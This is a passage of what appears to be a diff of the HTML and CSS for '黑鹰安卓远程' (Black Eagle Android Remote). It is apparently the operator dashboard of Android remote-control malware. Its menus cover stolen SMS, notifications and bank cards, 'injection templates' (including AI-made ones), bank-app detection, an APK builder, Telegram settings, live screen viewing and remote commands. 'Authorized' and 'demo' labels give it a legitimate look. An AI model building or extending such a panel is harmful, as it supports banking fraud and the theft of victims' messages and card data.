#295585;color:#7fb9ff;border-radius:7px;cursor:pointer}.module-action:disabled{opacity:.5;cursor:default}.muted{color:#8294a7}.warn{color:#e2a05b}.success{color:#19d796}.sectionbar{display:flex;align-items:center;justify-content:space-between;gap:20px;margin-bottom:8px}.edit-dialog{width:min(450px,95vw);background:#151d28;color:#cbd8e8;border:1px solid #46556a;border-radius:12px;padding:24px;box-shadow:0 24px 70px #000b}.edit-dialog::backdrop{background:#000a}.edit-dialog h2{margin:0 0 15px;font-size:17px}.edit-dialog label{display:block;font-size:12px;margin:14px 0}.edit-dialog input,.edit-dialog textarea{display:block;width:100%;margin-top:8px;background:#0d141c;color:#dce7f7;border:1px solid #37475a;border-radius:7px;padding:9px;resize:vertical}.edit-actions{display:flex;justify-content:flex-end;gap:8px}.edit-actions button{border-radius:6px;padding:8px 12px;background:#252f3c;border:1px solid #435269;color:#dae5f2}.edit-actions button.primary{background:#1956a8;border-color:#3676cf;color:white}#meta-error{min-height:20px;color:#ed7884}.card .detail{height:19px}.card .actionbar{display:flex;gap:5px;position:absolute;bottom:7px;right:9px}.card .actionbar button{background:#192737;border:1px solid #32465c;border-radius:5px;font-size:10px;color:#8ac7fa;padding:2px 6px}.card .actionbar button:hover{background:#24405e}.card.demo-card::after{display:none;content:'演示';position:absolute;top:8px;right:7px;font-size:9px;color:#cda360;background:#46311b;padding:2px 4px;border-radius:4px}#detail .topline .tool{font-size:10px}#detail .topline{flex-wrap:wrap;align-content:center}.empty-state{grid-column:1/-1;border:1px dashed #374558;border-radius:9px;text-align:center;padding:46px;color:#97a8b9}.empty-state b{display:block;font-size:17px;margin-bottom:10px;color:#d4deec}.pair-value{font-size:27px;letter-spacing:4px;color:#3ce4ad;font-weight:700}.small-note{font-size:11px;color:#8195aa}.copy-action{margin-left:12px;cursor:pointer}.layout-note{background:#362814;border:1px solid #7d5a25;color:#f0b86b;padding:7px 10px;border-radius:6px;margin:6px 0}
+.control-page .screen.live-screen{position:relative;overflow:hidden;align-items:center;justify-content:center}
+.control-page #be-live-image{display:none;width:100%;height:100%;object-fit:contain;background:#000}
+.control-page #be-live-hint{position:absolute;left:12px;right:12px;top:50%;transform:translateY(-50%);color:#8496af;text-align:center;font-size:12px;line-height:2;pointer-events:none}
+.control-page #be-live-badge{position:absolute;top:7px;left:7px;padding:4px 7px;background:#083423d9;border:1px solid #0c7953;color:#53ed9f;border-radius:6px;font-size:10px;display:none}
+.control-page #be-screen-stopview{display:none;position:absolute;right:7px;top:7px;background:#233042f0;border:1px solid #50627b;color:#fff;padding:4px 6px;border-radius:5px;cursor:pointer}
+</style><style id="v52-enhancement">
+/* V5.2 preserves the fixed 46/54 controller layout and existing palette. */
+.control-page .tabs{overflow-x:auto;scrollbar-width:thin;scrollbar-color:#3b4e66 #171e28}
+.control-page .tabs .tool{flex:0 0 auto}
+.control-page .device-info-panel{display:none;position:absolute;top:63px;bottom:12px;left:16px;right:16px;overflow-y:auto;align-self:stretch;color:#c7d4e3;font-size:12px}
+.control-page .analysis.has-device-panel .device-info-panel{display:block}
+.control-page .analysis.has-device-panel #panel-empty-icon,.control-page .analysis.has-device-panel #panel-empty-text{display:none}
+.detail-last{font-size:10px;color:#86a5c7;white-space:nowrap}
+.info-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:8px;align-content:start}
+.info-tile{background:#101923;border:1px solid #304052;border-radius:7px;padding:11px 12px;min-width:0}
+.info-tile .info-label{color:#879cb3;font-size:11px;margin-bottom:6px}
+.info-tile .info-value{color:#dfebf8;font-size:13px;overflow-wrap:anywhere}
+.info-tile .info-value.good{color:#2bdf9c}.info-tile .info-value.dim{color:#9cacc0}
+.device-mgmt-row{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-top:15px}
+.device-mgmt-row button{border:1px solid #36639c;border-radius:6px;background:#1a3555;color:#b4d9ff;padding:8px 12px;cursor:pointer}
+.device-mgmt-row button.warn{background:#3b2025;border-color:#814452;color:#ffc4cb}
+.device-mgmt-row button:disabled{opacity:.45}
+.device-mgmt-note{font-size:11px;line-height:1.65;color:#91a5b8;margin-top:16px}
+.device-event{display:grid;grid-template-columns:170px minmax(110px,1fr) 2fr;gap:10px;padding:11px 10px;border-bottom:1px solid #344050;font-size:11px;overflow-wrap:anywhere}
+.device-event-head{color:#88acd5;border-bottom:1px solid #43566a;font-weight:600}
+.device-event .event-time{color:#8fa2bc}
+@media(max-width:970px){.info-grid{grid-template-columns:1fr}.device-event{grid-template-columns:1fr 1fr}.device-event>:last-child{grid-column:1/-1}}
+.control-page .screen.live-screen{position:relative;overflow:hidden;align-items:center;justify-content:center}
+.control-page #be-live-image{display:none;width:100%;height:100%;object-fit:contain;background:#000}
+.control-page #be-live-hint{position:absolute;left:12px;right:12px;top:50%;transform:translateY(-50%);color:#8496af;text-align:center;font-size:12px;line-height:2;pointer-events:none}
+.control-page #be-live-badge{position:absolute;top:7px;left:7px;padding:4px 7px;background:#083423d9;border:1px solid #0c7953;color:#53ed9f;border-radius:6px;font-size:10px;display:none}
+.control-page #be-screen-stopview{display:none;position:absolute;right:7px;top:7px;background:#233042f0;border:1px solid #50627b;color:#fff;padding:4px 6px;border-radius:5px;cursor:pointer}
+</style><style id="v531-live-repair">
+#detail .screen.live-screen{position:relative!important;overflow:hidden!important;background:#000}
+#detail .screen.live-screen #be-live-image{display:none;width:100%;height:100%;object-fit:contain;background:#000}
+#detail .screen.live-screen #be-live-hint{position:absolute;top:48%;left:10px;right:10px;transform:translateY(-50%);text-align:center;color:#8fa9c7;font-size:11px;line-height:1.8;pointer-events:none}
+#detail .screen.live-screen #be-live-badge{display:none;position:absolute;top:8px;left:8px;background:#083c2b;color:#87ffd2;border-radius:5px;padding:4px 7px;font-size:10px}
+#detail .screen.live-screen #be-screen-stopview{display:none;position:absolute;right:7px;top:7px;background:#26374d;color:white;border:1px solid #5a7187;padding:4px 7px;border-radius:5px;cursor:pointer}
+#detail .screen.live-screen #be-screen-diag{position:absolute;bottom:8px;left:6px;right:6px;background:#162031dd;color:#c2ddff;border-radius:4px;padding:5px 7px;font-size:10px;text-align:left;overflow-wrap:anywhere;line-height:1.5}
+</style><style id="v54-control-key-styles">
+#detail .commands{grid-template-columns:repeat(8,minmax(0,1fr));grid-auto-rows:23px;gap:4px;overflow-y:auto;scrollbar-width:thin;padding:7px}
+#detail .commands button{font-size:10px;border-radius:4px;white-space:nowrap;text-overflow:ellipsis;padding:0 2px}
+#detail .commands button.be-ready{color:#e3f4ff;background:#205cd1;border-color:#397cfa;cursor:pointer}
+#detail .commands button.be-ready:hover{background:#3479ef}
+#detail .commands button[disabled]{background:#101721;color:#5d6b7b;border-color:#293646;cursor:not-allowed;opacity:1}
+#detail .screen.live-screen:fullscreen{width:100vw!important;height:100vh!important;background:#000;display:flex;align-items:center;justify-content:center;border-radius:0}
+#detail .screen.live-screen:fullscreen #be-live-image{width:100%!important;height:100%!important;max-height:100%!important;object-fit:contain}
+.be-viewer-dialog{background:#141d29;color:#d1e0f1;border:1px solid #445773;border-radius:11px;max-width:min(450px,94vw);width:440px;box-shadow:0 20px 80px #000a;padding:20px;font-size:13px}
+.be-viewer-dialog::backdrop{background:#000a}
+.be-viewer-dialog h3{font-size:18px;margin:0 0 15px;color:#e8f3ff}.be-viewer-dialog h3 small{display:block;font-size:11px;font-weight:400;color:#8baccf;margin-top:6px}
+.be-viewer-dialog label{display:flex;justify-content:space-between;align-items:center;padding:10px 0;gap:12px;border-bottom:1px solid #303e50}
+.be-viewer-dialog label select,.be-viewer-dialog label input{background:#0b1420;color:#dceaff;border:1px solid #3a536f;border-radius:6px;padding:6px;max-width:190px}
+.be-v-row{display:flex;justify-content:flex-end;gap:10px;margin-top:20px}
+.be-v-row button{padding:8px 16px;background:#174b94;border:1px solid #3479ca;color:#e8f5ff;border-radius:6px}
+.be-viewer-dialog p,.be-key-content p{line-height:1.7;color:#9fbbda;white-space:pre-wrap}
+</style><style id="v54-head-style">
+#detail .topline{display:flex;height:36px;align-items:center;gap:5px;overflow-x:auto;scrollbar-width:thin;white-space:nowrap}
+#detail .topline>b{font-size:15px;flex:0 0 auto}
+#detail .topline>span,#detail .topline>button{flex-shrink:0}
+#detail .topline #dev-id{max-width:185px;overflow:hidden;text-overflow:ellipsis}
+#detail .topline #dev-last{font-size:10px;color:#9ab5d0}
+#detail .topline .detail-mini{font-size:10px;color:#8cabc9;border:1px solid #2c3948;background:#131b25;border-radius:5px;padding:4px 5px}
+#detail .topline .detail-mini strong{color:#d6ebff;font-weight:500}
+#detail .topline .detail-server{color:#57aafc;cursor:pointer;background:#112439;border-color:#245080}
+#detail .topline .detail-server:hover{background:#193853}
+#listing .heading .righthead strong{color:#bccbe0;font-weight:500}
+#head-server-live{color:#21c989;border:1px solid #285244;border-radius:5px;background:#0d261d;padding:4px 8px;cursor:pointer;font-size:10px}
+</style></head><body>
+<aside class="side" id="sidebar"><div class="brand"><span class="eagle">🦅</span>黑鹰安卓远程</div><button><span class="ico">⌂</span>控制台</button><div class="group-title">数据管理</div><button class="active"><span class="ico">▣</span>设备</button><button><span class="ico">▤</span>短信</button><button><span class="ico">♧</span>通知</button><button><span class="ico">▭</span>银行卡</button><button><span class="ico">▣</span>注入数据</button><div class="group-title">设备管理</div><button><span class="ico">♧</span>分组管理　⌄</button><button><span class="ico">⊘</span>黑名单</button><div class="group-title">注入策略</div><button><span class="ico">◎</span>应用设置</button><button><span class="ico">♢</span>注入模板</button><button><span class="ico">✣</span>AI制作模板</button><button><span class="ico">♧</span>短信通知规则</button><button><span class="ico">▤</span>银行检测配置</button><div class="group-title">构建分发</div><button><span class="ico">⚒</span>APK构建</button><div class="group-title">系统设置</div><button><span class="ico">♙</span>用户设置</button><button><span class="ico">♢</span>安全中心</button><button><span class="ico">▤</span>服务器状态</button><button><span class="ico">⌁</span>TURN节点</button><button><span class="ico">▤</span>Telegram设置</button><div class="bottom"><span class="dot">●</span> 系统运行中　v2.0</div></aside>
+<main class="viewport" id="main">
+<div id="listing"><div class="heading"><div class="path">◫　设备管理</div><div class="righthead"><div class="field">金额</div><div class="field">越南盾 VND⌄</div><b>=　0.00</b><div class="field">美元 USD⌄</div><div class="field slim">南非⌄</div><span>南非时间: <strong id="clock-sa">--:--:--</strong></span><span>|</span><span>北京时间: <strong id="clock-bj">--:--:--</strong></span><span class="topicon">⟳</span><button class="header-server" id="head-server-live" type="button" title="查看服务器/IP">● 服务器检测中</button><span class="topicon">🦅</span></div></div>
+<div class="stats"><div class="metric red">▯ <span class="n" id="sum-total">0</span> 总设备</div><div class="metric green">⌁ <span class="n" id="sum-online">0</span> 在线</div><div class="metric">⌁ <span class="n" id="sum-offline">0</span> 离线</div><div class="metric blue"><span id="sum-access">0</span> 无障碍</div><div class="metric orange"><span id="sum-adb">0</span> ADB</div><div class="metric cyan"><span id="sum-ai">0</span> AI分析</div><div class="modebar" aria-label="设备模式"><button class="modechoice active" id="mode-demo" title="仅用于页面与功能测试">◈ 演示设备</button><button class="modechoice" id="mode-real" title="仅显示已授权注册的实际手机">◉ 真实设备</button><span id="mode-tag">演示数据 · 非真实连接</span></div></div>
+<div class="toolbar"><button class="tool small selected">▦</button><button class="tool small">☷</button><input id="search" placeholder="⌕ 搜索设备名、型号、IP、备注..."/><select class="tool" id="group-filter" aria-label="选择分组"><option value="all">全部分组</option></select><select class="tool" id="status-filter" aria-label="在线状态"><option value="all">数据筛选 · 全部</option><option value="online">在线</option><option value="offline">离线</option></select><select class="tool" id="country-filter" aria-label="国家筛选"><option value="all">◎ 国家筛选</option></select><button class="tool">全部应用</button><button class="tool on">♧ 全局通知</button><button class="tool" disabled>♧ 分组</button><button class="tool" disabled>♧ 置顶</button><button class="tool" disabled>↔ 批量转移</button><button class="tool" disabled>➤ 批量下发</button><button class="tool" disabled>⊘ 批量拉黑</button><button class="tool" disabled>▤ 批量删除</button><button class="tool">□ 全选</button><button class="tool">⌁ 全选离线</button><button class="tool">▣ 日期</button><button class="tool" id="export-csv">⇩ 导出CSV</button><button class="tool" id="add-pair" hidden>⊕ 设备接入</button><button class="tool" id="refresh">⟳ 刷新</button><button class="tool" id="preview">◈ 布局预览</button><button class="tool" id="logout">退出</button></div>
+<div class="frame"><div class="cards" id="cards"></div></div><div class="pagination"><span class="preview-mark" id="source-label">正在读取设备数据…</span><span>每页行数</span><select id="page-size"><option>20</option><option selected>50</option><option>100</option></select><span id="pageinfo">0 / 共 0</span><button class="page-arrow" id="page-prev">‹</button><span id="page-number">1</span><button class="page-arrow" id="page-next">›</button></div></div>
+<div id="module"><h2 id="modtitle"></h2><p id="moddesc"></p><div id="module-content"></div></div><div id="detail" class="control-page"><div class="topline"><button class="tool" id="back">← 返回设备管理</button><b id="dev-name">Redmi A5</b><span class="tag access" id="dev-status">未连接</span><span class="tag" id="dev-network">—</span><span class="tag sim" id="dev-mode">演示</span><span class="tag access" title="未经手机端授权与验证">权限未上报</span><span class="battery" id="dev-battery">—</span><span class="tag screen" id="dev-id">设备ID: —</span><span id="dev-system">系统 —</span><span id="dev-last" class="detail-last">心跳 —</span><span class="detail-mini">南非 <strong id="detail-clock-sa">--:--:--</strong></span><span class="detail-mini">北京 <strong id="detail-clock-bj">--:--:--</strong></span><span class="detail-mini" id="dev-ip-live" title="设备真实上报 IP">IP: 未上报</span><span class="detail-mini" id="dev-netstate">地区未上报</span><button type="button" class="detail-mini detail-server" id="detail-ipserver">服务器: 检测中 · IP/服务器</button><span id="dev-server-live" class="detail-mini" hidden></span><button class="tool" id="detail-edit">名称/备注/分组</button><button class="tool" id="detail-revoke" hidden>撤销授权</button></div><div class="threepane"><div class="leftpane"><div class="screens"><div class="screen live-screen"><div id="be-live-hint">手机端打开黑鹰客户端 → 点击开始屏幕共享<br>允许 Android 系统录屏授权后，画面才会显示</div><img id="be-live-image" alt="已获授权的实时手机屏幕"><div id="be-live-badge">● 手机正在共享</div><button id="be-screen-stopview" type="button">停止观看</button></div><div class="screen">无实际视频画面</div><div class="screen">无实际ADB画面</div></div><div class="quick"><div><button class="tool">🌐 同步翻译</button><button class="tool">▤ 虚拟键盘</button></div><div><button class="tool">⌂</button><button class="tool">⚙</button><button class="tool">发送</button></div></div><div class="commands" id="commands"></div></div><div class="rightpane"><div class="tabs" id="tabs"></div><div class="analysis"><div class="sectionlabel" id="panel-title">⌁　设备信息</div><div class="rightactions"><button class="tool" id="detail-refresh">⟳ 刷新信息</button><button class="tool" id="detail-analysis" disabled title="AI分析尚未接入">立即分析（未接入）</button></div><div class="phonecircle" id="panel-empty-icon" hidden>🤖</div><div id="panel-empty-text" hidden>该设备尚未进行AI分析</div><div id="device-info-panel" class="device-info-panel" role="region" aria-label="设备信息和操作记录"></div></div></div></div></div>
+</main><dialog id="meta-dialog" class="edit-dialog"><form id="meta-form"><h2>设备信息管理</h2><p id="editing-label"></p><label id="name-field">设备显示名称<input id="meta-name" maxlength="80" minlength="2" placeholder="例如：Pixel 3 测试机"></label><label>分组名称<input id="meta-group" maxlength="45" placeholder="例如：测试组、海外业务组"></label><label>备注<textarea id="meta-note" maxlength="500" rows="5" placeholder="添加设备用途或管理备注"></textarea></label><div class="edit-actions"><button type="button" id="meta-cancel">取消</button><button type="submit" class="primary" id="meta-save">保存到数据库</button></div><p id="meta-error" role="status"></p></form></dialog><script src="/app.js?v=540" defer></script></body></html>
